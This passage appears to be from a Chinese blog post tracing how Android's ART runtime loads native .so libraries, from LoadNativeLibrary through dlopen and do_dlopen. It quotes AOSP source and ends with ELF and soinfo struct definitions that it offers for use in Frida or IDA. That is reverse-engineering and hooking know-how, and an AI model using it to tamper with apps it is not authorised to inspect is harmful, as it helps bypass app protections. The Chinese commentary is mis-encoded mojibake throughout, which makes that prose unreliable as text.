ObjPtr&lt;mirror::Class> caller = soa.Decode&lt;mirror::Class>(caller_class); ObjPtr&lt;mirror::DexCache> dex_cache = caller->GetDexCache(); if (dex_cache != nullptr) &#123; caller_location = dex_cache->GetLocation()->ToModifiedUtf8(); &#125; &#125; &#125; class_loader_allocator = class_linker->GetAllocatorForClassLoader(loader.Ptr()); CHECK(class_loader_allocator != nullptr); &#125; if (library != nullptr) &#123; // Use the allocator pointers for class loader equality to avoid unnecessary weak root decode. if (library->GetClassLoaderAllocator() != class_loader_allocator) &#123; // The library will be associated with class_loader. The JNI // spec says we can't load the same library into more than one // class loader. // // This isn't very common. So spend some time to get a readable message. auto call_to_string = [&amp;](jobject obj) -> std::string &#123; if (obj == nullptr) &#123; return \"null\"; &#125; // Handle jweaks. Ignore double local-ref. ScopedLocalRef&lt;jobject> local_ref(env, env->NewLocalRef(obj)); if (local_ref != nullptr) &#123; ScopedLocalRef&lt;jclass> local_class(env, env->GetObjectClass(local_ref.get())); jmethodID to_string = env->GetMethodID(local_class.get(), \"toString\", \"()Ljava/lang/String;\"); DCHECK(to_string != nullptr); ScopedLocalRef&lt;jobject> local_string(env, env->CallObjectMethod(local_ref.get(), to_string)); if (local_string != nullptr) &#123; ScopedUtfChars utf(env, reinterpret_cast&lt;jstring>(local_string.get())); if (utf.c_str() != nullptr) &#123; return utf.c_str(); &#125; &#125; if (env->ExceptionCheck()) &#123; // We can't do much better logging, really. So leave it with a Describe. env->ExceptionDescribe(); env->ExceptionClear(); &#125; return \"(Error calling toString)\"; &#125; return \"null\"; &#125;; std::string old_class_loader = call_to_string(library->GetClassLoader()); std::string new_class_loader = call_to_string(class_loader); StringAppendF(error_msg, \"Shared library \\\"%s\\\" already opened by \" \"ClassLoader %p(%s); can't open in ClassLoader %p(%s)\", path.c_str(), library->GetClassLoader(), old_class_loader.c_str(), class_loader, new_class_loader.c_str()); LOG(WARNING) &lt;&lt; *error_msg; return false; &#125; VLOG(jni) &lt;&lt; \"[Shared library \\\"\" &lt;&lt; path &lt;&lt; \"\\\" already loaded in \" &lt;&lt; \" ClassLoader \" &lt;&lt; class_loader &lt;&lt; \"]\"; if (!library->CheckOnLoadResult()) &#123; StringAppendF(error_msg, \"JNI_OnLoad failed on a previous attempt \" \"to load \\\"%s\\\"\", path.c_str()); return false; &#125; return true; &#125; // é˜¶æ®µäºŒï¼šåŠ è½½ so // Open the shared library. Because we're using a full path, the system // doesn't have to search through LD_LIBRARY_PATH. (It may do so to // resolve this library's dependencies though.) // Failures here are expected when java.library.path has several entries // and we have to hunt for the lib. // Below we dlopen but there is no paired dlclose, this would be necessary if we supported // class unloading. Libraries will only be unloaded when the reference count (incremented by // dlopen) becomes zero from dlclose. // Retrieve the library path from the classloader, if necessary. ScopedLocalRef&lt;jstring> library_path(env, GetLibrarySearchPath(env, class_loader)); Locks::mutator_lock_->AssertNotHeld(self); const char* path_str = path.empty() ? nullptr : path.c_str(); bool needs_native_bridge = false; char* nativeloader_error_msg = nullptr; // è°ƒç”¨ dlopen æ‰“å¼€ç›®æ ‡ so void* handle = android::OpenNativeLibrary( env, runtime_->GetTargetSdkVersion(), path_str, class_loader, (caller_location.empty() ? nullptr : caller_location.c_str()), library_path.get(), &amp;needs_native_bridge, &amp;nativeloader_error_msg); VLOG(jni) &lt;&lt; \"[Call to dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) returned \" &lt;&lt; handle &lt;&lt; \"]\"; if (handle == nullptr) &#123; *error_msg = nativeloader_error_msg; android::NativeLoaderFreeErrorMessage(nativeloader_error_msg); VLOG(jni) &lt;&lt; \"dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) failed: \" &lt;&lt; *error_msg; return false; &#125; if (env->ExceptionCheck() == JNI_TRUE) &#123; LOG(ERROR) &lt;&lt; \"Unexpected exception:\"; env->ExceptionDescribe(); env->ExceptionClear(); &#125; // Create a new entry. // TODO: move the locking (and more of this logic) into Libraries. bool created_library = false; &#123; // Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering. std::unique_ptr&lt;SharedLibrary> new_library( new SharedLibrary(env, self, path, handle, needs_native_bridge, class_loader, class_loader_allocator)); MutexLock mu(self, *Locks::jni_libraries_lock_); library = libraries_->Get(path); if (library == nullptr) &#123; // We won race to get libraries_lock. library = new_library.release(); libraries_->Put(path, library); created_library = true; &#125; &#125; if (!created_library) &#123; LOG(INFO) &lt;&lt; \"WOW: we lost a race to add shared library: \" &lt;&lt; \"\\\"\" &lt;&lt; path &lt;&lt; \"\\\" ClassLoader=\" &lt;&lt; class_loader; return library->CheckOnLoadResult(); &#125; // åŠ¨æ€é“¾æ¥åº“è£…è½½å®Œæˆ VLOG(jni) &lt;&lt; \"[Added shared library \\\"\" &lt;&lt; path &lt;&lt; \"\\\" for ClassLoader \" &lt;&lt; class_loader &lt;&lt; \"]\"; // é˜¶æ®µä¸‰ï¼šå½“ so è¢«åŠ è½½ä¹‹åï¼Œç«‹å³è°ƒç”¨å¯¼å‡ºå‡½æ•° JNI_OnLoad bool was_successful = false; void* sym = library->FindSymbol(\"JNI_OnLoad\", nullptr); if (sym == nullptr) &#123; VLOG(jni) &lt;&lt; \"[No JNI_OnLoad found in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; was_successful = true; &#125; else &#123; // Call JNI_OnLoad. We have to override the current class // loader, which will always be \"null\" since the stuff at the // top of the stack is around Runtime.loadLibrary(). (See // the comments in the JNI FindClass function.) ScopedLocalRef&lt;jobject> old_class_loader(env, env->NewLocalRef(self->GetClassLoaderOverride())); self->SetClassLoaderOverride(class_loader); VLOG(jni) &lt;&lt; \"[Calling JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; using JNI_OnLoadFn = int(*)(JavaVM*, void*); JNI_OnLoadFn jni_on_load = reinterpret_cast&lt;JNI_OnLoadFn>(sym); int version = (*jni_on_load)(this, nullptr); if (IsSdkVersionSetAndAtMost(runtime_->GetTargetSdkVersion(), SdkVersion::kL)) &#123; // Make sure that sigchain owns SIGSEGV. EnsureFrontOfChain(SIGSEGV); &#125; self->SetClassLoaderOverride(old_class_loader.get()); if (version == JNI_ERR) &#123; StringAppendF(error_msg, \"JNI_ERR returned from JNI_OnLoad in \\\"%s\\\"\", path.c_str()); &#125; else if (JavaVMExt::IsBadJniVersion(version)) &#123; StringAppendF(error_msg, \"Bad JNI version returned from JNI_OnLoad in \\\"%s\\\": %d\", path.c_str(), version); // It's unwise to call dlclose() here, but we can mark it // as bad and ensure that future load attempts will fail. // We don't know how far JNI_OnLoad got, so there could // be some partially-initialized stuff accessible through // newly-registered native method calls. We could try to // unregister them, but that doesn't seem worthwhile. &#125; else &#123; was_successful = true; &#125; VLOG(jni) &lt;&lt; \"[Returned \" &lt;&lt; (was_successful ? \"successfully\" : \"failure\") &lt;&lt; \" from JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; &#125; library->SetResult(was_successful); return was_successful;&#125;# so çš„åŠ è½½è¿‡ç¨‹ åœ¨åˆšåˆšå¯¹äº vm-&gt;LoadNativeLibrary å‡½æ•° soåŠ è½½æ—¶ çš„ç®€è¦åˆ†æä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ç›®æ ‡ so æ˜¯é€šè¿‡ dlopen æ‰“å¼€çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä» android::OpenNativeLibrary å‡½æ•°å¼€å§‹åˆ†æ //android-platform\\art\\runtime\\jni\\java_vm_ext.ccbool JavaVMExt::LoadNativeLibrary(JNIEnv* env, const std::string&amp; path, jobject class_loader, jclass caller_class, std::string* error_msg) &#123; error_msg->clear(); // é˜¶æ®µä¸€ï¼šåˆ¤æ–­ç›®æ ‡ so æ˜¯å¦å·²ç»è¢«åŠ è½½è¿‡ ... // é˜¶æ®µäºŒï¼šåŠ è½½ so // Open the shared library. Because we're using a full path, the system // doesn't have to search through LD_LIBRARY_PATH. (It may do so to // resolve this library's dependencies though.) // Failures here are expected when java.library.path has several entries // and we have to hunt for the lib. // Below we dlopen but there is no paired dlclose, this would be necessary if we supported // class unloading. Libraries will only be unloaded when the reference count (incremented by // dlopen) becomes zero from dlclose. // Retrieve the library path from the classloader, if necessary. ScopedLocalRef&lt;jstring> library_path(env, GetLibrarySearchPath(env, class_loader)); Locks::mutator_lock_->AssertNotHeld(self); const char* path_str = path.empty() ? nullptr : path.c_str(); bool needs_native_bridge = false; char* nativeloader_error_msg = nullptr; // è°ƒç”¨ dlopen æ‰“å¼€ç›®æ ‡ so void* handle = android::OpenNativeLibrary( env, runtime_->GetTargetSdkVersion(), path_str, class_loader, (caller_location.empty() ? nullptr : caller_location.c_str()), library_path.get(), &amp;needs_native_bridge, &amp;nativeloader_error_msg); VLOG(jni) &lt;&lt; \"[Call to dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) returned \" &lt;&lt; handle &lt;&lt; \"]\"; if (handle == nullptr) &#123; *error_msg = nativeloader_error_msg; android::NativeLoaderFreeErrorMessage(nativeloader_error_msg); VLOG(jni) &lt;&lt; \"dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) failed: \" &lt;&lt; *error_msg; return false; &#125; if (env->ExceptionCheck() == JNI_TRUE) &#123; LOG(ERROR) &lt;&lt; \"Unexpected exception:\"; env->ExceptionDescribe(); env->ExceptionClear(); &#125; // Create a new entry. // TODO: move the locking (and more of this logic) into Libraries. bool created_library = false; &#123; // Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering. std::unique_ptr&lt;SharedLibrary> new_library( new SharedLibrary(env, self, path, handle, needs_native_bridge, class_loader, class_loader_allocator)); MutexLock mu(self, *Locks::jni_libraries_lock_); library = libraries_->Get(path); if (library == nullptr) &#123; // We won race to get libraries_lock. library = new_library.release(); libraries_->Put(path, library); created_library = true; &#125; &#125; if (!created_library) &#123; LOG(INFO) &lt;&lt; \"WOW: we lost a race to add shared library: \" &lt;&lt; \"\\\"\" &lt;&lt; path &lt;&lt; \"\\\" ClassLoader=\" &lt;&lt; class_loader; return library->CheckOnLoadResult(); &#125; // åŠ¨æ€é“¾æ¥åº“è£…è½½å®Œæˆ VLOG(jni) &lt;&lt; \"[Added shared library \\\"\" &lt;&lt; path &lt;&lt; \"\\\" for ClassLoader \" &lt;&lt; class_loader &lt;&lt; \"]\"; // é˜¶æ®µä¸‰ï¼šå½“ so è¢«åŠ è½½ä¹‹åï¼Œç«‹å³è°ƒç”¨å¯¼å‡ºå‡½æ•° JNI_OnLoad ...&#125;# android::OpenNativeLibrary è¿™ä¸ªå‡½æ•°ä¸­æœ‰æ¡ä»¶ç¼–è¯‘ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æçš„æ˜¯ ART_TARGET_ANDROID çš„ç¼–è¯‘æ¡ä»¶åˆ†æ”¯ è·Ÿè¸ª path å‚æ•°ï¼Œå¯ä»¥å‘ç°å®ƒè¢«ä¼ å…¥åˆ°äº† android_dlopen_ext(const char* filename, int flag, const android_dlextinfo* extinfo) å‡½æ•°ä¸­ï¼Œ flag RTLD_NOW çš„å«ä¹‰æ˜¯ç«‹å³è§£ææ‰€æœ‰ç¬¦å·ï¼Œå¹¶åœ¨åŠ è½½æ—¶æŠ¥å‘Šä»»ä½•è§£æé”™è¯¯ android_dlopen_ext å‡½æ•°çš„å¸¸è§ flag å«ä¹‰ RTLD_NOW ç«‹å³è§£ææ‰€æœ‰ç¬¦å·ï¼Œå¹¶åœ¨åŠ è½½æ—¶æŠ¥å‘Šä»»ä½•è§£æé”™è¯¯ RTLD_LAZY åªåœ¨ç¬¦å·é¦–æ¬¡ä½¿ç”¨æ—¶è§£æ RTLD_GLOBAL å°†åº“åŠå…¶ç¬¦å·æ·»åŠ åˆ°å…¨å±€å‘½åç©ºé—´ä¸­ï¼Œä»¥ä¾¿å…¶ä»–åº“å¯ä»¥ä½¿ç”¨è¿™äº›ç¬¦å· extinfo çš„å€¼ä¸º &#123;.flags = ANDROID_DLEXT_USE_NAMESPACE,.library_namespace = boot_namespace,&#125;; //android-platform\\art\\libnativeloader\\native_loader.cppvoid* OpenNativeLibrary(JNIEnv* env, int32_t target_sdk_version, const char* path, jobject class_loader, const char* caller_location, jstring library_path, bool* needs_native_bridge, char** error_msg) &#123;// æ¡ä»¶ç¼–è¯‘//ART_TARGET_ANDROID - Defined for target Android builds of ART.//ref: https://android.googlesource.com/platform/art/+/32c8337/runtime/globals.h#if defined(ART_TARGET_ANDROID) UNUSED(target_sdk_version); if (class_loader == nullptr) &#123; *needs_native_bridge = false; if (caller_location != nullptr) &#123; android_namespace_t* boot_namespace = FindExportedNamespace(caller_location); if (boot_namespace != nullptr) &#123; const android_dlextinfo dlextinfo = &#123; .flags = ANDROID_DLEXT_USE_NAMESPACE, .library_namespace = boot_namespace, &#125;; // è°ƒç”¨ android_dlopen_ext, å¹¶ä¼ å…¥ path void* handle = android_dlopen_ext(path, RTLD_NOW, &amp;dlextinfo); if (handle == nullptr) &#123; *error_msg = strdup(dlerror()); &#125; return handle; &#125; &#125; // Check if the library is in NATIVELOADER_DEFAULT_NAMESPACE_LIBS and should // be loaded from the kNativeloaderExtraLibs namespace. &#123; Result&lt;void*> handle = TryLoadNativeloaderExtraLib(path); if (!handle.ok()) &#123; *error_msg = strdup(handle.error().message().c_str()); return nullptr; &#125; if (handle.value() != nullptr) &#123; return handle.value(); &#125; &#125; // Fall back to the system namespace. This happens for preloaded JNI // libraries in the zygote. // TODO(b/185833744): Investigate if this should fall back to the app main // namespace (aka anonymous namespace) instead. void* handle = OpenSystemLibrary(path, RTLD_NOW); if (handle == nullptr) &#123; *error_msg = strdup(dlerror()); &#125; return handle; &#125; std::lock_guard&lt;std::mutex> guard(g_namespaces_mutex); NativeLoaderNamespace* ns; if ((ns = g_namespaces->FindNamespaceByClassLoader(env, class_loader)) == nullptr) &#123; // This is the case where the classloader was not created by ApplicationLoaders // In this case we create an isolated not-shared namespace for it. Result&lt;NativeLoaderNamespace*> isolated_ns = CreateClassLoaderNamespaceLocked(env, target_sdk_version, class_loader, /*is_shared=*/false, /*dex_path=*/nullptr, library_path, /*permitted_path=*/nullptr, /*uses_library_list=*/nullptr); if (!isolated_ns.ok()) &#123; *error_msg = strdup(isolated_ns.error().message().c_str()); return nullptr; &#125; else &#123; ns = *isolated_ns; &#125; &#125; return OpenNativeLibraryInNamespace(ns, path, needs_native_bridge, error_msg);#else UNUSED(env, target_sdk_version, class_loader, caller_location); // Do some best effort to emulate library-path support. It will not // work for dependencies. // // Note: null has a special meaning and must be preserved. std::string c_library_path; // Empty string by default. if (library_path != nullptr &amp;&amp; path != nullptr &amp;&amp; path[0] != '/') &#123; ScopedUtfChars library_path_utf_chars(env, library_path); c_library_path = library_path_utf_chars.c_str(); &#125; std::vector&lt;std::string> library_paths = base::Split(c_library_path, \":\"); for (const std::string&amp; lib_path : library_paths) &#123; *needs_native_bridge = false; const char* path_arg; std::string complete_path; if (path == nullptr) &#123; // Preserve null. path_arg = nullptr; &#125; else &#123; complete_path = lib_path; if (!complete_path.empty()) &#123; complete_path.append(\"/\"); &#125; complete_path.append(path); path_arg = complete_path.c_str(); &#125; void* handle = dlopen(path_arg, RTLD_NOW); if (handle != nullptr) &#123; return handle; &#125; if (NativeBridgeIsSupported(path_arg)) &#123; *needs_native_bridge = true; handle = NativeBridgeLoadLibrary(path_arg, RTLD_NOW); if (handle != nullptr) &#123; return handle; &#125; *error_msg = strdup(NativeBridgeGetError()); &#125; else &#123; *error_msg = strdup(dlerror()); &#125; &#125; return nullptr;#endif&#125;# android_dlopen_ext android_dlopen_ext è°ƒç”¨äº† __loader_android_dlopen_ext åœ¨ä»£ç çš„ç¬¬å››è¡Œå‡ºç°äº†å†…å»ºå‡½æ•° __builtin_return_address(LEVEL) , è¿™ä¸ªå‡½æ•°ç”¨æ¥è¿”å›å½“å‰å‡½æ•°æˆ–è°ƒç”¨è€…çš„è¿”å›åœ°å€ã€‚å‡½æ•°çš„å‚æ•° LEVEL è¡¨ç¤ºå‡½æ•°è°ƒç”¨é“¾ä¸­çš„ä¸åŒå±‚æ¬¡çš„å‡½æ•°ï¼Œå„ä¸ªå€¼ä»£è¡¨çš„æ„ä¹‰å¦‚ä¸‹: 0ï¼šè¿”å›å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ï¼› 1ï¼šè¿”å›å½“å‰å‡½æ•°è°ƒç”¨è€…çš„è¿”å›åœ°å€ï¼› 2ï¼šè¿”å›å½“å‰å‡½æ•°è°ƒç”¨è€…çš„è°ƒç”¨è€…çš„è¿”å›åœ°å€ï¼› //android-platform\\bionic\\libdl\\libdl.cpp__attribute__((__weak__))void* android_dlopen_ext(const char* filename, int flag, const android_dlextinfo* extinfo) &#123; const void* caller_addr = __builtin_return_address(0); return __loader_android_dlopen_ext(filename, flag, extinfo, caller_addr);&#125;# __loader_android_dlopen_ext __loader_android_dlopen_ext è°ƒç”¨äº† dlopen_ext //android-platform\\bionic\\linker\\dlfcn.cppvoid* __loader_android_dlopen_ext(const char* filename, int flags, const android_dlextinfo* extinfo, const void* caller_addr) &#123; return dlopen_ext(filename, flags, extinfo, caller_addr);&#125;# dlopen_ext dlopen_ext ä¸­è°ƒç”¨äº† do_dlopen //android-platform\\bionic\\linker\\dlfcn.cppstatic void* dlopen_ext(const char* filename, int flags, const android_dlextinfo* extinfo, const void* caller_addr) &#123; ScopedPthreadMutexLocker locker(&amp;g_dl_mutex); g_linker_logger.ResetState(); void* result = do_dlopen(filename, flags, extinfo, caller_addr); if (result == nullptr) &#123; __bionic_format_dlerror(\"dlopen failed\", linker_get_error_buffer()); return nullptr; &#125; return result;&#125;# do_dlopen è¿™ä¸ªå‡½æ•°ä¸­æœ€ä¸ºå…³é”®çš„æ˜¯è°ƒç”¨ find_library è·å–åˆ°äº†å¾…åŠ è½½ so çš„ soinfo //android-platform\\bionic\\linker\\linker.cppvoid* do_dlopen(const char* name, int flags, const android_dlextinfo* extinfo, const void* caller_addr) &#123; std::string trace_prefix = std::string(\"dlopen: \") + (name == nullptr ? \"(nullptr)\" : name); ScopedTrace trace(trace_prefix.c_str()); ScopedTrace loading_trace((trace_prefix + \" - loading and linking\").c_str()); soinfo* const caller = find_containing_library(caller_addr); android_namespace_t* ns = get_caller_namespace(caller); LD_LOG(kLogDlopen, \"dlopen(name=\\\"%s\\\", flags=0x%x, extinfo=%s, caller=\\\"%s\\\", caller_ns=%s@%p, targetSdkVersion=%i) ...\", name, flags, android_dlextinfo_to_string(extinfo).c_str(), caller == nullptr ? \"(null)\" : caller->get_realpath(), ns == nullptr ? \"(null)\" : ns->get_name(), ns, get_application_target_sdk_version()); auto purge_guard = android::base::make_scope_guard([&amp;]() &#123; purge_unused_memory(); &#125;); auto failure_guard = android::base::make_scope_guard( [&amp;]() &#123; LD_LOG(kLogDlopen, \"... dlopen failed: %s\", linker_get_error_buffer()); &#125;); // å¯¹ flags çš„åˆæ³•æ€§è¿›è¡Œåˆ¤æ–­ if ((flags &amp; ~(RTLD_NOW|RTLD_LAZY|RTLD_LOCAL|RTLD_GLOBAL|RTLD_NODELETE|RTLD_NOLOAD)) != 0) &#123; DL_OPEN_ERR(\"invalid flags to dlopen: %x\", flags); return nullptr; &#125; // å¯¹ extinfo çš„åˆæ³•æ€§è¿›è¡Œåˆ¤æ–­ if (extinfo != nullptr) &#123; if ((extinfo->flags &amp; ~(ANDROID_DLEXT_VALID_FLAG_BITS)) != 0) &#123; DL_OPEN_ERR(\"invalid extended flags to android_dlopen_ext: 0x%\" PRIx64, extinfo->flags); return nullptr; &#125; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) == 0 &amp;&amp; (extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) &#123; DL_OPEN_ERR(\"invalid extended flag combination (ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET without \" \"ANDROID_DLEXT_USE_LIBRARY_FD): 0x%\" PRIx64, extinfo->flags); return nullptr; &#125; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_NAMESPACE) != 0) &#123; if (extinfo->library_namespace == nullptr) &#123; DL_OPEN_ERR(\"ANDROID_DLEXT_USE_NAMESPACE is set but extinfo->library_namespace is null\"); return nullptr; &#125; ns = extinfo->library_namespace; &#125; &#125; // Workaround for dlopen(/system/lib/&lt;soname>) when .so is in /apex. http://b/121248172 // The workaround works only when targetSdkVersion &lt; Q. // å½“ apk çš„ targetSdkVersion&lt;Q æ—¶æ‰ä¼šå°† /system è·¯å¾„è½¬æ¢æˆ /apex è·¯å¾„ (ä¸å¤ªæ¸…æ¥šè¿™æ ·åšçš„æ„ä¹‰æ˜¯ä»€ä¹ˆ) std::string name_to_apex; if (translateSystemPathToApexPath(name, &amp;name_to_apex)) &#123; const char* new_name = name_to_apex.c_str(); LD_LOG(kLogDlopen, \"dlopen considering translation from %s to APEX path %s\", name, new_name); // Some APEXs could be optionally disabled. Only translate the path // when the old file is absent and the new file exists. // TODO(b/124218500): Re-enable it once app compat issue is resolved /* if (file_exists(name)) &#123; LD_LOG(kLogDlopen, \"dlopen %s exists, not translating\", name); &#125; else */ if (!file_exists(new_name)) &#123; LD_LOG(kLogDlopen, \"dlopen %s does not exist, not translating\", new_name); &#125; else &#123; LD_LOG(kLogDlopen, \"dlopen translation accepted: using %s\", new_name); name = new_name; &#125; &#125; // End Workaround for dlopen(/system/lib/&lt;soname>) when .so is in /apex. std::string asan_name_holder; const char* translated_name = name; if (g_is_asan &amp;&amp; translated_name != nullptr &amp;&amp; translated_name[0] == '/') &#123; char original_path[PATH_MAX]; if (realpath(name, original_path) != nullptr) &#123; asan_name_holder = std::string(kAsanLibDirPrefix) + original_path; if (file_exists(asan_name_holder.c_str())) &#123; soinfo* si = nullptr; if (find_loaded_library_by_realpath(ns, original_path, true, &amp;si)) &#123; PRINT(\"linker_asan dlopen NOT translating \\\"%s\\\" -> \\\"%s\\\": library already loaded\", name, asan_name_holder.c_str()); &#125; else &#123; PRINT(\"linker_asan dlopen translating \\\"%s\\\" -> \\\"%s\\\"\", name, translated_name); translated_name = asan_name_holder.c_str(); &#125; &#125; &#125; &#125; ProtectedDataGuard guard; // é‡å¤´æˆï¼Œè¿™é‡Œè°ƒç”¨äº† find_library è·å–åˆ°äº†è¿™ä¸ª so çš„ soinfo soinfo* si = find_library(ns, translated_name, flags, extinfo, caller); loading_trace.End(); if (si != nullptr) &#123; void* handle = si->to_handle(); LD_LOG(kLogDlopen, \"... dlopen calling constructors: realpath=\\\"%s\\\", soname=\\\"%s\\\", handle=%p\", si->get_realpath(), si->get_soname(), handle); // è°ƒç”¨ call_constructors å‡½æ•°æ¥åŠ è½½ so ä¸­çš„ init ä»¥åŠ init_array si->call_constructors(); failure_guard.Disable(); LD_LOG(kLogDlopen, \"... dlopen successful: realpath=\\\"%s\\\", soname=\\\"%s\\\", handle=%p\", si->get_realpath(), si->get_soname(), handle); return handle; &#125; return nullptr;&#125;# soinfo soinfo ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼Œå¯ä»¥ç”¨åœ¨ frida æˆ–è€… ida ä¸­ //IMPORTANT//ELF64 å¯ç”¨è¯¥å®#define __LP64__ 1//ELF32 å¯ç”¨è¯¥å®//#define __work_around_b_24465209__ 1/*//https://android.googlesource.com/platform/bionic/+/master/linker/Android.bpæ¶æ„ä¸º 32 ä½ å®šä¹‰__work_around_b_24465209__å®arch: &#123; arm: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, x86: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, &#125;*///android-platform\\bionic\\libc\\include\\link.h#if defined(__LP64__)#define ElfW(type) Elf64_ ## type#else#define ElfW(type) Elf32_ ## type#endif//android-platform\\bionic\\linker\\linker_common_types.h// Android uses RELA for LP64.#if defined(__LP64__)#define USE_RELA 1#endif//android-platform\\bionic\\libc\\kernel\\uapi\\asm-generic\\int-ll64.h//__signed__-->signedtypedef signed char __s8;typedef unsigned char __u8;typedef signed short __s16;typedef unsigned short __u16;typedef signed int __s32;typedef unsigned int __u32;typedef signed long long __s64;typedef unsigned long long __u64;//A12-src\\msm-google\\include\\uapi\\linux\\elf.h/* 32-bit ELF base types. */typedef __u32 Elf32_Addr;typedef __u16 Elf32_Half;typedef __u32 Elf32_Off;typedef __s32 Elf32_Sword;typedef __u32 Elf32_Word;/* 64-bit ELF base types. */typedef __u64 Elf64_Addr;typedef __u16 Elf64_Half;typedef __s16 Elf64_SHalf;typedef __u64 Elf64_Off;typedef __s32 Elf64_Sword;typedef __u32 Elf64_Word;typedef __u64 Elf64_Xword;typedef __s64 Elf64_Sxword;typedef struct dynamic&#123; Elf32_Sword d_tag; union&#123; Elf32_Sword d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn;typedef struct &#123; Elf64_Sxword d_tag; /* entry tag value */ union &#123; Elf64_Xword d_val; Elf64_Addr d_ptr; &#125; d_un;&#125; Elf64_Dyn;typedef struct elf32_rel &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;typedef struct elf64_rel &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */&#125; Elf64_Rel;typedef struct elf32_rela&#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend;&#125; Elf32_Rela;typedef struct elf64_rela &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */ Elf64_Sxword r_addend; /* Constant addend used to compute value */&#125; Elf64_Rela;typedef struct elf32_sym&#123; Elf32_Word st_name; Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym;typedef struct elf64_sym &#123; Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */&#125; Elf64_Sym;#define EI_NIDENT 16typedef struct elf32_hdr&#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; /* Entry point */ Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr;typedef struct elf64_hdr &#123; unsigned char e_ident[EI_NIDENT]; /* ELF \"magic number\" */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx;&#125; Elf64_Ehdr;/* These constants define the permissions on sections in the program header, p_flags. */#define PF_R 0x4#define PF_W 0x2#define PF_X 0x1typedef struct elf32_phdr&#123; Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align;&#125; Elf32_Phdr;typedef struct elf64_phdr &#123; Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file &amp; memory */&#125; Elf64_Phdr;typedef struct elf32_shdr &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr;typedef struct elf64_shdr &#123; Elf64_Word sh_name; /* Section name, index in string tbl */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr;typedef unsigned long uintptr_t;struct link_map&#123; uintptr_t l_addr; char * l_name; uintptr_t l_ld; struct link_map * l_next; struct link_map * l_prev;&#125;;//android-platform\\bionic\\linker\\linker_soinfo.htypedef void (*linker_dtor_function_t)();typedef void (*linker_ctor_function_t)(int, char**, char**);#if defined(__work_around_b_24465209__)#define SOINFO_NAME_LEN 128#endifstruct soinfo &#123;#if defined(__work_around_b_24465209__) char old_name_[SOINFO_NAME_LEN];#endif const ElfW(Phdr)* phdr; size_t phnum;#if defined(__work_around_b_24465209__) ElfW(Addr) unused0; // DO NOT USE, maintained for compatibility.#endif ElfW(Addr) base; size_t size;#if defined(__work_around_b_24465209__) uint32_t unused1; // DO NOT USE, maintained for compatibility.#endif ElfW(Dyn)* dynamic;#if defined(__work_around_b_24465209__) uint32_t unused2; // DO NOT USE, maintained for compatibility uint32_t unused3; // DO NOT USE, maintained for 